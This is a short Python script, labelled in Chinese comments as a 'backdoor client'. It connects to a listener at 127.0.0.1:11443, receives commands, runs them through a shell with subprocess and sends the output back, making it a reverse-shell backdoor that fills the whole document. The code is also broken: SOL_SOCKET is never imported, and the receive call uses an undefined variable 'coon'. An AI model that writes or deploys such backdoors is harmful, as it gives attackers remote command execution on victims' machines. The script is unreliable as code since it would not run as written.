import socket, subprocess


"""后门客户端"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) #  重用选项
s.connect(("127.0.0.1", 11443))
s.send("connect")
while True:
	data = coon.recv(1024)
	if data == "quit":
		break
	proc = subprocess.Popen(data, shell = True,  stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE) #  创建进程，后面参数是输入、输出、错误信息的管道
	result = proc.stdout.read() + proc.stderr.read()
	s.send(result)
s.close()
